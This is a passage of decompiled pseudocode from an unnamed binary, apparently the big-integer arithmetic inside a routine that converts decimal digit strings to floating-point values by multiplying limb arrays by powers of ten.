(puVar12 != puVar11);\n                    puVar11 = var_1d4h;\n                    if (uVar10 != 0) {\n                        if (var_1d4h < 0x73) {\n                            (&var_1d0h)[var_1d4h] = uVar10;\n                            var_1d4h = var_1d4h + 1;\n                            puVar11 = var_1d4h;\n                        }\n                        else {\n                            var_914h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004b9f7c(&var_1d0h, 0x1cc, &var_910h, 0);\n                            puVar11 = var_1d4h;\n                        }\n                    }\n                }\n                if (var_920h != NULL) {\n                    puVar8 = NULL;\n                    puVar12 = var_920h;\n                    if (puVar11 != NULL) {\n                        do {\n                            ppuVar1 = &var_1d0h + puVar8;\n                            puVar7 = *ppuVar1;\n                            *ppuVar1 = *ppuVar1 + puVar12;\n                            puVar12 = CARRY4(puVar7, puVar12);\n                            puVar8 = puVar8 + 1;\n                            puVar11 = var_1d4h;\n                        } while (puVar8 != var_1d4h);\n                    }\n                    if (puVar12 != NULL) {\n                        if (puVar11 < 0x73) {\n                            (&var_1d0h)[puVar11] = puVar12;\n                            var_1d4h = var_1d4h + 1;\n                            puVar11 = var_1d4h;\n                        }\n                        else {\n                            var_914h = NULL;\n                            var_1d4h = NULL;\n                            fcn.004b9f7c(&var_1d0h, 0x1cc, &var_910h, 0);\n                            puVar11 = var_1d4h;\n                        }\n                    }\n                }\n                var_920h = NULL;\n                uVar10 = 0;\n            }\n            var_920h = var_920h * 10 + *puVar14;\n            uVar10 = uVar10 + 1;\n            puVar14 = puVar14 + 1;\n        } while (puVar14 != var_954h);\n        var_93ch = puVar14;\n        var_918h = puVar11;\n        if (uVar10 != 0) {\n            var_92ch = uVar10 % 10;\n            for (var_934h = uVar10 / 10; var_918h = puVar11,  var_934h != NULL; var_934h = var_934h - var_928h) {\n                var_928h = var_934h;\n                if (0x26 < var_934h) {\n                    var_928h = 0x26;\n                }\n                uVar10 = *(var_928h * 4 + 0x552016);\n                uVar13 = *(var_928h * 4 + 0x552017);\n                var_914h = uVar10 + uVar13;\n                fcn.0040314d(&var_910h, 0, uVar10 * 4);\n                fcn.0040576d(&var_910h + uVar10, *(var_928h * 4 + 0x552014) * 4 + 0x551540, uVar13 << 2);\n                uVar10 = var_1d0h;\n                if (var_914h < 0x2) {\n                    if (var_910h == 0) {\n                        var_574h = NULL;\n                        puVar15 = &var_570h;\ncode_r0x004b6037:\n                        var_1d4h = NULL;\n                        fcn.004b9f7c(&var_1d0h, 0x1cc, puVar15, 0);\n                    }\n                    else {\n                        if ((var_910h == 1) || (puVar11 == NULL)) {\n                            bVar16 = true;\n                            goto code_r0x004b6313;\n                        }\n                        uVar10 = 0;\n                        puVar14 = NULL;\n                        do {\n                            uVar13 = (&var_1d0h)[puVar14];\n                            uVar3 = var_910h * uVar13;\n                            (&var_1d0h)[puVar14] = uVar3 + uVar10;\n                            uVar10 = (var_910h * uVar13 >> 0x20) + CARRY4(uVar3, uVar10);\n                            puVar14 = puVar14 + 1;\n                        } while (puVar14 != puVar11);\n                        if (uVar10 != 0) {\n                            if (0x72 < var_1d4h) {\ncode_r0x004b60b0:\n                                var_914h = NULL;\n                                var_1d4h = NULL;\n                                fcn.004b9f7c(&var_1d0h, 0x1cc, &var_910h, 0);\n                                bVar16 = false;\n                                var_918h = var_1d4h;\n                                goto code_r0x004b6313;\n                            }\n                            (&var_1d0h)[var_1d4h] = uVar10;\ncode_r0x004b60a1:\n                            var_1d4h = var_1d4h + 1;\n                        }\n                    }\ncode_r0x004b604c:\n                    bVar16 = true;\n                    var_918h = var_1d4h;\n                }\n                else if (puVar11 < 0x2) {\n                    var_1d4h = var_914h;\n                    fcn.004b9f7c(&var_1d0h, 0x1cc, &var_910h, var_914h << 2);\n                    if (uVar10 == 0) {\n                        var_914h = NULL;\n                        puVar15 = &var_910h;\n                        goto code_r0x004b6037;\n                    }\n                    bVar16 = true;\n                    var_918h = var_1d4h;\n                    if ((uVar10 != 1) && (var_1d4h != NULL)) {\n                        uVar13 = 0;\n                        puVar14 = NULL;\n                        do {\n                            uVar3 = (&var_1d0h)[puVar14];\n                            uVar4 = uVar10 * uVar3;\n                            (&var_1d0h)[puVar14] = uVar4 + uVar13;\n                            uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                            puVar14 = puVar14 + 1;\n                        } while (puVar14 != var_1d4h);\n                        if (uVar13 != 0) {\n                            if (0x72 < var_1d4h) goto code_r0x004b60b0;\n                            (&var_1d0h)[var_1d4h] = uVar13;\n                            goto code_r0x004b60a1;\n                        }\n                        goto code_r0x004b604c;\n                    }\n                }\n                else {\n                    var_918h = &var_910h;\n                    if (puVar11 <= var_914h) {\n                        var_918h = &var_1d0h;\n                    }\n                    var_93ch = &var_1d0h;\n                    puVar14 = puVar11;\n                    var_930h = var_914h;\n                    if (puVar11 <= var_914h) {\n                        var_93ch = &var_910h;\n                        puVar14 = var_914h;\n                        var_930h = puVar11;\n                    }\n                    var_1d4h = NULL;\n                    puVar11 = NULL;\n                    var_574h = NULL;\n                    if (var_930h != NULL) {\n                        do {\n                            if (var_918h[puVar11] == 0) {\n                                if (puVar11 == var_1d4h) {\n                                    (&var_570h)[puVar11] = 0;\n                                    var_1d4h = puVar11 + 1;\n                                    var_574h = var_1d4h;\n                                }\n                            }\n                            else {\n                                puVar8 = NULL;\n                                var_924h = NULL;\n                                puVar12 = puVar11;\n                                if (puVar14 != NULL) {\n                                    do {\n                                        puVar9 = var_924h;\n                                        if (puVar12 == 0x73) break;\n                                        if (puVar12 == var_1d4h) {\n                                            (&var_570h)[puVar12] = 0;\n                                            var_574h = puVar11 + 1 + puVar8;\n                                        }\n                                        uVar10 = var_93ch[puVar8];\n                                        uVar13 = var_918h[puVar11];\n                                        uVar4 = uVar10 * uVar13;\n                                        uVar3 = (&var_570h)[puVar12];\n                                        uVar5 = uVar4 + (&var_570h)[puVar12];\n                                        (&var_570h)[puVar12] = uVar5 + var_924h;\n                                        puVar9 = (uVar10 * uVar13 >> 0x20) + CARRY4(uVar4, uVar3) +\n                                                 CARRY4(uVar5, var_924h);\n                                        puVar8 = puVar8 + 1;\n                                        puVar12 = puVar12 + 1;\n                                        var_1d4h = var_574h;\n                                        var_924h = puVar9;\n                                    } while (puVar8 != puVar14);\n                                    do {\n                                        if (puVar9 == NULL) break;\n                                        if (puVar12 == 0x73) goto code_r0x004b6384;\n                                        if (puVar12 == var_1d4h) {\n                                            (&var_570h)[puVar12] = 0;\n                                            var_574h = puVar12 + 1;\n                                        }\n                                        ppuVar1 = &var_570h + puVar12;\n                                        puVar7 = *ppuVar1;\n                                        *ppuVar1 = *ppuVar1 + puVar9;\n                                        puVar9 = CARRY4(puVar7, puVar9);\n                                        puVar12 = puVar12 + 1;\n                                        var_1d4h = var_574h;\n                                    } while( true );\n                                }\n                                if (puVar12 == 0x73) {\ncode_r0x004b6384:\n                                    var_b2ch = NULL;\n                                    var_1d4h = NULL;\n                                    fcn.004b9f7c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                                    bVar16 = false;\n                                    goto code_r0x004b6304;\n                                }\n                            }\n                            puVar11 = puVar11 + 1;\n                        } while (puVar11 != var_930h);\n                    }\n                    fcn.004b9f7c(&var_1d0h, 0x1cc, &var_570h, var_1d4h << 2);\n                    bVar16 = true;\ncode_r0x004b6304:\n                    var_918h = var_1d4h;\n                }\ncode_r0x004b6313:\n                if (!bVar16) goto code_r0x004b6348;\n                puVar11 = var_918h;\n            }\n            if (var_92ch != NULL) {\n                uVar10 = *(var_92ch * 4 + 0x5520cc);\n                if (uVar10 == 0) {\ncode_r0x004b6348:\n                    var_b2ch = NULL;\n                    var_1d4h = NULL;\n                    fcn.004b9f7c(&var_1d0h, 0x1cc, &var_b28h, 0);\ncode_r0x004b6373:\n                    var_918h = var_1d4h;\n                }\n                else if ((uVar10 != 1) && (puVar11 != NULL)) {\n                    uVar13 = 0;\n                    puVar14 = NULL;\n                    do {\n                        uVar3 = (&var_1d0h)[puVar14];\n                        uVar4 = uVar10 * uVar3;\n                        (&var_1d0h)[puVar14] = uVar4 + uVar13;\n                        uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                        puVar14 = puVar14 + 1;\n                    } while (puVar14 != puVar11);\n                    if (uVar13 == 0) goto code_r0x004b6373;\n                    if (0x72 < var_1d4h) goto code_r0x004b6348;\n                    (&var_1d0h)[var_1d4h] = uVar13;\n                    var_1d4h = var_1d4h + 1;\n                    var_918h = var_1d4h;\n                }\n            }\n            if (var_920h != NULL) {\n                puVar11 = NULL;\n                puVar14 = var_920h;\n                if (var_918h != NULL) {\n                    do {\n                        ppuVar1 = &var_1d0h + puVar11;\n                        puVar7 = *ppuVar1;\n                        *ppuVar1 = *ppuVar1 + puVar14;\n                        puVar14 = CARRY4(puVar7, puVar14);\n                        var_918h = var_1d4h;\n                        puVar11 = puVar11 + 1;\n                    } while (puVar11 != var_1d4h);\n                }\n                if (puVar14 != NULL) {\n                    if (var_918h < 0x73) {\n                        (&var_1d0h)[var_918h] = puVar14;\n                        var_1d4h = var_1d4h + 1;\n                        var_918h = var_1d4h;\n                    }\n                    else {\n                        var_b2ch = NULL;\n                        var_1d4h = NULL;\n                        fcn.004b9f7c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                        var_918h = var_1d4h;\n                    }\n                }\n            }\n        }\n    }\n    if (var_938h != NULL) {\n        var_92ch = var_938h % 10;\n        puVar14 = var_918h;\n        for (var_924h = var_938h / 10; var_918h = puVar14,  var_924h != NULL; var_924h = var_924h - var_920h) {\n            var_920h = var_924h;\n            if (0x26 < var_924h) {\n                var_920h = 0x26;\n            }\n            uVar10 = *(var_920h * 4 + 0x552016);\n            uVar13 = *(var_920h * 4 + 0x552017);\n            var_914h = uVar10 + uVar13;\n            fcn.0040314d(&var_910h, 0, uVar10 * 4);\n            fcn.0040576d(&var_910h + uVar10, *(var_920h * 4 + 0x552014) * 4 + 0x551540, uVar13 << 2);\n            uVar10 = var_1d0h;\n            if (var_914h < 0x2) {\n                if (var_910h == 0) {\ncode_r0x004b6573:\n                    var_1d4h = NULL;\n                    var_b2ch = NULL;\n                    fcn.004b9f7c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                }\n                else {\n                    if ((var_910h == 1) || (puVar14 == NULL)) {\n                        bVar16 = true;\n                        goto code_r0x004b684c;\n                    }\n                    uVar10 = 0;\n                    puVar11 = NULL;\n                    do {\n                        uVar13 = (&var_1d0h)[puVar11];\n                        uVar3 = var_910h * uVar13;\n                        (&var_1d0h)[puVar11] = uVar3 + uVar10;\n                        uVar10 = (var_910h * uVar13 >> 0x20) + CARRY4(uVar3, uVar10);\n                        puVar11 = puVar11 + 1;\n                    } while (puVar11 != puVar14);\n                    if (uVar10 != 0) {\n                        if (0x72 < var_1d4h) {\ncode_r0x004b65ec:\n                            var_b2ch = NULL;\n                            var_1d4h = NULL;\n                            fcn.004b9f7c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                            bVar16 = false;\n                            var_918h = var_1d4h;\n                            goto code_r0x004b684c;\n                        }\n                        (&var_1d0h)[var_1d4h] = uVar10;\ncode_r0x004b65dd:\n                        var_1d4h = var_1d4h + 1;\n                    }\n                }\ncode_r0x004b6588:\n                bVar16 = true;\n                var_918h = var_1d4h;\n            }\n            else if (puVar14 < 0x2) {\n                var_1d4h = var_914h;\n                fcn.004b9f7c(&var_1d0h, 0x1cc, &var_910h, var_914h << 2);\n                if (uVar10 == 0) goto code_r0x004b6573;\n                bVar16 = true;\n                var_918h = var_1d4h;\n                if ((uVar10 != 1) && (var_1d4h != NULL)) {\n                    uVar13 = 0;\n                    puVar14 = NULL;\n                    do {\n                        uVar3 = (&var_1d0h)[puVar14];\n                        uVar4 = uVar10 * uVar3;\n                        (&var_1d0h)[puVar14] = uVar4 + uVar13;\n                        uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                        puVar14 = puVar14 + 1;\n                    } while (puVar14 != var_1d4h);\n                    if (uVar13 != 0) {\n                        if (0x72 < var_1d4h) goto code_r0x004b65ec;\n                        (&var_1d0h)[var_1d4h] = uVar13;\n                        goto code_r0x004b65dd;\n                    }\n                    goto code_r0x004b6588;\n                }\n            }\n            else {\n                var_928h = &var_910h;\n                if (puVar14 <= var_914h) {\n                    var_928h = &var_1d0h;\n                }\n                var_934h = &var_1d0h;\n                puVar11 = puVar14;\n                var_93ch = var_914h;\n                if (puVar14 <= var_914h) {\n                    var_934h = &var_910h;\n                    puVar11 = var_914h;\n                    var_93ch = puVar14;\n                }\n                var_1d4h = NULL;\n                puVar14 = NULL;\n                var_574h = NULL;\n                if (var_93ch != NULL) {\n                    do {\n                        if (var_928h[puVar14] == 0) {\n                            if (puVar14 == var_1d4h) {\n                                (&var_570h)[puVar14] = 0;\n                                var_1d4h = puVar14 + 1;\n                                var_574h = var_1d4h;\n                            }\n                        }\n                        else {\n                            uVar10 = 0;\n                            var_930h = NULL;\n                            puVar12 = puVar14;\n                            if (puVar11 != NULL) {\n                                do {\n                                    if (puVar12 == 0x73) break;\n                                    if (puVar12 == var_1d4h) {\n                                        (&var_570h)[puVar12] = 0;\n                                        var_574h = puVar14 + 1 + var_930h;\n                                    }\n                                    uVar13 = var_934h[var_930h];\n                                    uVar3 = var_928h[puVar14];\n                                    uVar5 = uVar13 * uVar3;\n                                    uVar6 = uVar5 + uVar10;\n                                    puVar8 = &var_570h + puVar12;\n                                    uVar4 = *puVar8;\n                                    *puVar8 = *puVar8 + uVar6;\n                                    uVar10 = (uVar13 * uVar3 >> 0x20) + CARRY4(uVar5, uVar10) + CARRY4(uVar4, uVar6);\n                                    var_930h = var_930h + 1;\n                                    puVar12 = puVar12 + 1;\n                                    var_1d4h = var_574h;\n                                } while (var_930h != puVar11);\n                                do {\n                                    if (uVar10 == 0) break;\n                                    if (puVar12 == 0x73) goto code_r0x004b68ca;\n                                    if (puVar12 == var_1d4h) {\n                                        (&var_570h)[puVar12] = 0;\n                                        var_574h = puVar12 + 1;\n                                    }\n                                    puVar8 = &var_570h + puVar12;\n                                    uVar13 = *puVar8;\n                                    *puVar8 = *puVar8 + uVar10;\n                                    uVar10 = CARRY4(uVar13, uVar10);\n                                    puVar12 = puVar12 + 1;\n                                    var_1d4h = var_574h;\n                                } while( true );\n                            }\n                            if (puVar12 == 0x73) {\ncode_r0x004b68ca:\n                                var_b2ch = NULL;\n                                var_1d4h = NULL;\n                                fcn.004b9f7c(&var_1d0h, 0x1cc, &var_b28h, 0);\n                                bVar16 = false;\n                                goto code_r0x004b6840;\n                            }\n                        }\n                        puVar14 = puVar14 + 1;\n                    } while (puVar14 != var_93ch);\n                }\n                fcn.004b9f7c(&var_1d0h, 0x1cc, &var_570h, var_1d4h << 2);\n                bVar16 = true;\ncode_r0x004b6840:\n                var_918h = var_1d4h;\n            }\ncode_r0x004b684c:\n            if (!bVar16) goto code_r0x004b6971;\n            puVar14 = var_918h;\n        }\n        if (var_92ch == NULL) goto code_r0x004b68bb;\n        uVar10 = *(var_92ch * 4 + 0x5520cc);\n        if (uVar10 == 0) {\n            var_b2ch = NULL;\n            var_1d4h = NULL;\n            fcn.004b9f7c(&var_1d0h, 0x1cc, &var_b28h, 0);\n            var_918h = var_1d4h;\n            goto code_r0x004b68bb;\n        }\n        if (uVar10 == 1) goto code_r0x004b68bb;\n        if (puVar14 == NULL) goto code_r0x004b68c3;\n        uVar13 = 0;\n        puVar11 = NULL;\n        do {\n            uVar3 = (&var_1d0h)[puVar11];\n            uVar4 = uVar10 * uVar3;\n            (&var_1d0h)[puVar11] = uVar4 + uVar13;\n            uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n            puVar11 = puVar11 + 1;\n        } while (puVar11 != puVar14);\n        var_918h = var_1d4h;\n        if (uVar13 == 0) goto code_r0x004b68bb;\n        var_918h = puVar14;\n        if (var_1d4h < 0x73) {\n            (&var_1d0h)[var_1d4h] = uVar13;\n            var_1d4h = var_1d4h + 1;\n            var_918h = var_1d4h;\n            goto code_r0x004b68bb;\n        }\ncode_r0x004b6971:\n        var_1d4h = NULL;\n        fcn.004b9f7c(&var_1d0h, 0x1cc, &var_b28h, 0);\n        fcn.00405042(*(var_948h + 0xc2), var_950h);\ncode_r0x004b69a9:\n        var_b2ch = NULL;\n        goto code_r0x004b7a5d;\n    }\ncode_r0x004b68bb:\n    if (var_918h == NULL) {\ncode_r0x004b68c3:\n        var_93ch = NULL;\n    }\n    else {\n        uVar10 = (&var_1d4h)[var_918h];\n        var_944h = 0;\n        iVar19 = 0x1f;\n        if (uVar10 != 0) {\n            for (; uVar10 >> iVar19 == 0; iVar19 = iVar19 + -1) {\n            }\n        }\n        if (uVar10 == 0) {\n            iVar19 = 0;\n        }\n        else {\n            iVar19 = iVar19 + 1;\n        }\n        var_93ch = (var_918h + -1) * 0x20 + iVar19;\n    }\n    if ((var_94ch <= var_93ch) || (var_91ch == NULL)) {\n        bVar16 = var_958h != var_954h;\n        uVar2 = *(var_948h + 0xc2);\ncode_r0x004b7a4e:\n        fcn.00401ece(&var_1d4h, var_93ch, uVar2, bVar16, var_950h);\n        goto code_r0x004b7a5d;\n    }\n    puVar14 = NULL;\n    var_3a4h = NULL;\n    uVar10 = 0;\n    var_924h = NULL;\n    var_920h = var_954h;\n    puVar11 = var_954h;\n    if (var_954h != var_958h) {\n        do {\n            puVar12 = var_924h;\n            if (uVar10 == 9) {\n                var_920h = puVar11;\n                if (puVar14 != NULL) {\n                    uVar10 = 0;\n                    puVar11 = NULL;\n                    do {\n                        uVar13 = (&var_3a0h)[puVar11];\n                        uVar3 = uVar13 * 1000000000;\n                        (&var_3a0h)[puVar11] = uVar3 + uVar10;\n                        uVar10 = (uVar13 * 1000000000 >> 0x20) + CARRY4(uVar3, uVar10);\n                        puVar11 = puVar11 + 1;\n                    } while (puVar11 != puVar14);\n                    puVar14 = var_3a4h;\n                    if (uVar10 != 0) {\n                        if (var_3a4h < 0x73) {\n                            (&var_3a0h)[var_3a4h] = uVar10;\n                            var_3a4h = var_3a4h + 1;\n                            puVar14 = var_3a4h;\n                        }\n                        else {\n                            var_b2ch = NULL;\n                            var_3a4h = NULL;\n                            fcn.004b9f7c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                            puVar14 = var_3a4h;\n                        }\n                    }\n                }\n                puVar11 = var_920h;\n                if (puVar12 != NULL) {\n                    puVar8 = NULL;\n                    if (puVar14 != NULL) {\n                        do {\n                            ppuVar1 = &var_3a0h + puVar8;\n                            puVar7 = *ppuVar1;\n                            *ppuVar1 = *ppuVar1 + puVar12;\n                            puVar12 = CARRY4(puVar7, puVar12);\n                            puVar8 = puVar8 + 1;\n                            puVar14 = var_3a4h;\n                        } while (puVar8 != var_3a4h);\n                    }\n                    if (puVar12 != NULL) {\n                        if (puVar14 < 0x73) {\n                            (&var_3a0h)[puVar14] = puVar12;\n                            var_3a4h = var_3a4h + 1;\n                            puVar14 = var_3a4h;\n                        }\n                        else {\n                            var_b2ch = NULL;\n                            var_3a4h = NULL;\n                            fcn.004b9f7c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                            puVar14 = var_3a4h;\n                        }\n                    }\n                }\n                var_924h = NULL;\n                uVar10 = 0;\n            }\n            var_924h = var_924h * 10 + *puVar11;\n            uVar10 = uVar10 + 1;\n            puVar11 = puVar11 + 1;\n        } while (puVar11 != var_958h);\n        var_920h = puVar11;\n        if (uVar10 != 0) {\n            var_940h = uVar10 % 10;\n            for (var_92ch = uVar10 / 10; var_92ch != NULL; var_92ch = var_92ch - var_920h) {\n                var_920h = var_92ch;\n                if (0x26 < var_92ch) {\n                    var_920h = 0x26;\n                }\n                uVar10 = *(var_920h * 4 + 0x552016);\n                uVar13 = *(var_920h * 4 + 0x552017);\n                var_914h = uVar10 + uVar13;\n                fcn.0040314d(&var_910h, 0, uVar10 * 4);\n                fcn.0040576d(&var_910h + uVar10, *(var_920h * 4 + 0x552014) * 4 + 0x551540, uVar13 << 2);\n                uVar10 = var_3a0h;\n                if (var_914h < 0x2) {\n                    if (var_910h == 0) {\n                        var_b2ch = NULL;\n                        var_3a4h = NULL;\n                        iVar19 = 0;\n                        puVar15 = &var_b28h;\n                        goto code_r0x004b6e85;\n                    }\n                    if ((var_910h == 1) || (puVar14 == NULL)) {\n                        bVar16 = true;\n                    }\n                    else {\n                        uVar13 = 0;\n                        puVar11 = NULL;\n                        do {\n                            uVar10 = (&var_3a0h)[puVar11];\n                            uVar3 = var_910h * uVar10;\n                            (&var_3a0h)[puVar11] = uVar3 + uVar13;\n                            uVar13 = (var_910h * uVar10 >> 0x20) + CARRY4(uVar3, uVar13);\n                            puVar11 = puVar11 + 1;\n                        } while (puVar11 != puVar14);\ncode_r0x004b6c3d:\n                        if (uVar13 != 0) {\n                            if (0x72 < var_3a4h) {\n                                var_b2ch = NULL;\n                                var_3a4h = NULL;\n                                fcn.004b9f7c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                                bVar16 = false;\n                                puVar14 = var_3a4h;\n                                goto code_r0x004b6e9c;\n                            }\n                            (&var_3a0h)[var_3a4h] = uVar13;\n                            var_3a4h = var_3a4h + 1;\n                        }\n                        bVar16 = true;\n                        puVar14 = var_3a4h;\n                    }\n                }\n                else {\n                    if (puVar14 < 0x2) {\n                        var_3a4h = var_914h;\n                        fcn.004b9f7c(&var_3a0h, 0x1cc, &var_910h, var_914h << 2);\n                        if (uVar10 != 0) {\n                            bVar16 = true;\n                            puVar14 = var_3a4h;\n                            if ((uVar10 != 1) && (var_3a4h != NULL)) {\n                                uVar13 = 0;\n                                puVar14 = NULL;\n                                do {\n                                    uVar3 = (&var_3a0h)[puVar14];\n                                    uVar4 = uVar10 * uVar3;\n                                    (&var_3a0h)[puVar14] = uVar4 + uVar13;\n                                    uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                                    puVar14 = puVar14 + 1;\n                                } while (puVar14 != var_3a4h);\n                                goto code_r0x004b6c3d;\n                            }\n                            goto code_r0x004b6e9c;\n                        }\n                        iVar19 = 0;\n                        var_b2ch = NULL;\n                        var_3a4h = NULL;\n                        puVar15 = &var_b28h;\n                    }\n                    else {\n                        var_928h = &var_910h;\n                        if (puVar14 <= var_914h) {\n                            var_928h = &var_3a0h;\n                        }\n                        var_934h = &var_3a0h;\n                        puVar11 = puVar14;\n                        var_938h = var_914h;\n                        if (puVar14 <= var_914h) {\n                            var_934h = &var_910h;\n                            puVar11 = var_914h;\n                            var_938h = puVar14;\n                        }\n                        var_3a4h = NULL;\n                        puVar14 = NULL;\n                        var_574h = NULL;\n                        if (var_938h != NULL) {\n                            do {\n                                if (var_928h[puVar14] == 0) {\n                                    if (puVar14 == var_3a4h) {\n                                        (&var_570h)[puVar14] = 0;\n                                        var_3a4h = puVar14 + 1;\n                                        var_574h = var_3a4h;\n                                    }\n                                }\n                                else {\n                                    uVar10 = 0;\n                                    var_930h = NULL;\n                                    puVar12 = puVar14;\n                                    if (puVar11 != NULL) {\n                                        do {\n                                            if (puVar12 == 0x73) break;\n                                            if (puVar12 == var_3a4h) {\n                                                (&var_570h)[puVar12] = 0;\n                                                var_574h = puVar14 + 1 + var_930h;\n                                            }\n                                            uVar13 = var_934h[var_930h];\n                                            uVar3 = var_928h[puVar14];\n                                            uVar5 = uVar13 * uVar3;\n                                            uVar6 = uVar5 + uVar10;\n                                            puVar8 = &var_570h + puVar12;\n                                            uVar4 = *puVar8;\n                                            *puVar8 = *puVar8 + uVar6;\n                                            uVar10 = (uVar13 * uVar3 >> 0x20) + CARRY4(uVar5, uVar10) +\n                                                     CARRY4(uVar4, uVar6);\n                                            var_930h = var_930h + 1;\n                                            puVar12 = puVar12 + 1;\n                                            var_3a4h = var_574h;\n                                        } while (var_930h != puVar11);\n                                        do {\n                                            if (uVar10 == 0) break;\n                                            if (puVar12 == 0x73) goto code_r0x004b6f33;\n                                            if (puVar12 == var_3a4h) {\n                                                (&var_570h)[puVar12] = 0;\n                                                var_574h = puVar12 + 1;\n                                            }\n                                            puVar8 = &var_570h + puVar12;\n                                            uVar13 = *puVar8;\n                                            *puVar8 = *puVar8 + uVar10;\n                                            uVar10 = CARRY4(uVar13, uVar10);\n                                            puVar12 = puVar12 + 1;\n                                            var_3a4h = var_574h;\n                                        } while( true );\n                                    }\n                                    if (puVar12 == 0x73) {\ncode_r0x004b6f33:\n                                        var_b2ch = NULL;\n                                        var_3a4h = NULL;\n                                        fcn.004b9f7c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                                        bVar16 = false;\n                                        puVar14 = var_3a4h;\n                                        goto code_r0x004b6e9c;\n                                    }\n                                }\n                                puVar14 = puVar14 + 1;\n                            } while (puVar14 != var_938h);\n                        }\n                        iVar19 = var_3a4h << 2;\n                        puVar15 = &var_570h;\n                    }\ncode_r0x004b6e85:\n                    fcn.004b9f7c(&var_3a0h, 0x1cc, puVar15, iVar19);\n                    bVar16 = true;\n                    puVar14 = var_3a4h;\n                }\ncode_r0x004b6e9c:\n                if (!bVar16) goto code_r0x004b6f85;\n            }\n            if (var_940h != NULL) {\n                uVar10 = *(var_940h * 4 + 0x5520cc);\n                if (uVar10 == 0) {\ncode_r0x004b6f85:\n                    var_3a4h = NULL;\n                    var_b2ch = NULL;\n                    fcn.004b9f7c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                    puVar14 = var_3a4h;\n                }\n                else if ((uVar10 != 1) && (puVar14 != NULL)) {\n                    uVar13 = 0;\n                    puVar11 = NULL;\n                    do {\n                        uVar3 = (&var_3a0h)[puVar11];\n                        uVar4 = uVar10 * uVar3;\n                        (&var_3a0h)[puVar11] = uVar4 + uVar13;\n                        uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                        puVar11 = puVar11 + 1;\n                    } while (puVar11 != puVar14);\n                    puVar14 = var_3a4h;\n                    if (uVar13 != 0) {\n                        if (0x72 < var_3a4h) goto code_r0x004b6f85;\n                        (&var_3a0h)[var_3a4h] = uVar13;\n                        var_3a4h = var_3a4h + 1;\n                        puVar14 = var_3a4h;\n                    }\n                }\n            }\n            if (var_924h != NULL) {\n                puVar12 = NULL;\n                puVar11 = var_924h;\n                if (puVar14 != NULL) {\n                    do {\n                        ppuVar1 = &var_3a0h + puVar12;\n                        puVar7 = *ppuVar1;\n                        *ppuVar1 = *ppuVar1 + puVar11;\n                        puVar11 = CARRY4(puVar7, puVar11);\n                        puVar12 = puVar12 + 1;\n                        puVar14 = var_3a4h;\n                    } while (puVar12 != var_3a4h);\n                }\n                if (puVar11 != NULL) {\n                    if (puVar14 < 0x73) {\n                        (&var_3a0h)[puVar14] = puVar11;\n                        var_3a4h = var_3a4h + 1;\n                        puVar14 = var_3a4h;\n                    }\n                    else {\n                        var_b2ch = NULL;\n                        var_3a4h = NULL;\n                        fcn.004b9f7c(&var_3a0h, 0x1cc, &var_b28h, 0);\n                        puVar14 = var_3a4h;\n                    }\n                }\n            }\n        }\n    }\n    var_928h = var_91ch;\n    if (*var_948h < 0) {\n        var_928h = var_91ch - *var_948h;\n    }\n    var_73ch = 0;\n    var_940h = var_928h % 10;\n    var_740h = 1;\n    var_91ch = 0x1;\n    var_744h = 0x1;\n    for (var_928h = var_928h / 10; var_928h != NULL; var_928h = var_928h - var_930h) {\n        var_930h = var_928h;\n        if (0x26 < var_928h) {\n            var_930h = 0x26;\n        }\n        puVar14 = var_930h;\n        uVar10 = *(var_930h * 4 + 0x552016);\n        uVar13 = *(var_930h * 4 + 0x552017);\n        var_914h = uVar10 + uVar13;\n        fcn.0040314d(&var_910h, 0, uVar10 * 4);\n        fcn.0040576d(&var_910h + uVar10, *(puVar14 * 4 + 0x552014) * 4 + 0x551540, uVar13 << 2);\n        uVar10 = var_740h;\n        if (var_914h < 0x2) {\n            if (var_910h == 0) {\ncode_r0x004b710a:\n                var_744h = NULL;\n                var_b2ch = NULL;\n                fcn.004b9f7c(&var_740h, 0x1cc, &var_b28h, 0);\n            }\n            else {\n                if ((var_910h == 1) || (var_91ch == NULL)) {\n                    bVar16 = true;\n                    goto code_r0x004b73d9;\n                }\n                uVar13 = 0;\n                puVar14 = NULL;\n                do {\n                    uVar10 = (&var_740h)[puVar14];\n                    uVar3 = var_910h * uVar10;\n                    (&var_740h)[puVar14] = uVar3 + uVar13;\n                    uVar13 = (var_910h * uVar10 >> 0x20) + CARRY4(uVar3, uVar13);\n                    puVar14 = puVar14 + 1;\n                } while (puVar14 != var_91ch);\ncode_r0x004b7216:\n                if (uVar13 != 0) {\n                    if (0x72 < var_744h) {\n                        var_b2ch = NULL;\n                        var_744h = NULL;\n                        fcn.004b9f7c(&var_740h, 0x1cc, &var_b28h, 0);\n                        bVar16 = false;\n                        var_91ch = var_744h;\n                        goto code_r0x004b73d9;\n                    }\n                    (&var_740h)[var_744h] = uVar13;\n                    var_744h = var_744h + 1;\n                }\n            }\n            bVar16 = true;\n            var_91ch = var_744h;\n        }\n        else if (var_91ch < 0x2) {\n            var_744h = var_914h;\n            fcn.004b9f7c(&var_740h, 0x1cc, &var_910h, var_914h << 2);\n            if (uVar10 == 0) goto code_r0x004b710a;\n            bVar16 = true;\n            var_91ch = var_744h;\n            if ((uVar10 != 1) && (var_744h != NULL)) {\n                uVar13 = 0;\n                puVar14 = NULL;\n                do {\n                    uVar3 = (&var_740h)[puVar14];\n                    uVar4 = uVar10 * uVar3;\n                    (&var_740h)[puVar14] = uVar4 + uVar13;\n                    uVar13 = (uVar10 * uVar3 >> 0x20) + CARRY4(uVar4, uVar13);\n                    puVar14 = puVar14 + 1;\n                } while (puVar14 != var_744h);\n                goto code_r0x004b7216;\n            }\n        }\n        else {\n            var_924h = &var_910h;\n            if 